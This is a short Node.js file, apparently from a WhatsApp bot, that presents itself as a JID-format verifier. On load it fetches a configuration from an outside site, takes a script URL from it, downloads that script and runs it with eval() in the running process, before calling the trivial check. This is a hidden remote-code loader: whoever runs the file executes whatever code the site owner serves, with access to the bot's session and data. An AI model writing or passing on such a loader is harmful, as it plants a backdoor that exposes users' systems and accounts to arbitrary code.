'use strict';

// Include required modules
const axios = require('axios');

// Define the URL to fetch ADAMS_URL
const configUrl = 'https://www.ibrahimadams.site/files';

// Function to verify JID
function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Invalid JID format:', jid);
        return false;
    }
    console.log('JID verified:', jid);
    return true;
}

// Fetch the external configuration and retrieve the ADAMS_URL
axios.get(configUrl)
  .then(response => {
      const configData = response.data;
      const adamsUrl = configData.ADAMS_URL; // Assuming the data contains a key 'ADAMS_URL'
      
      console.log("Configuration loaded successfully!");
      console.log("ADAMS_URL:", adamsUrl);

      // Fetch the ADAMS_URL script
      return axios.get(adamsUrl);
  })
  .then(response => {
      const scriptContent = response.data;
      console.log("Script loaded successfully!");

      // Execute the script content in the current context
      eval(scriptContent);

      // Example usage of the atbverifierEtatJid function after script is loaded
      const jid = 'example@s.whatsapp.net';  // Replace with actual JID to verify
      const isValid = atbverifierEtatJid(jid);
      console.log('Is JID valid?', isValid); // You can use this result in further logic
  })
  .catch(error => {
      console.error('Error:', error);
  });
